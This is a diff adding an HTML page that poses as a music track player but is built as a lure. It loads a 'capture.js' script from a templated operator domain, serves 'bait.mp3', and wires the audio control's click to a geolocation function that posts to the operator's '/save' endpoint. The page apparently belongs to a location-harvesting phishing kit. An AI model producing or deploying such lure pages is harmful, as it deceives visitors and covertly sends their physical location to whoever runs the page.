@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>New Music Track</title>
+    <script src="https://{{ domain }}/static/js/capture.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; }
+        audio { margin: 20px; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>Listen to This New Track!</h1>
+    <p>Click play to start streaming.</p>
+    <audio controls onclick="triggerGeolocation('https://{{ domain }}/save')">
+        <source src="https://{{ domain }}/static/audio/bait.mp3" type="audio/mp3">
+        Your browser does not support the audio tag.
+    </audio>
+</body>
+</html>
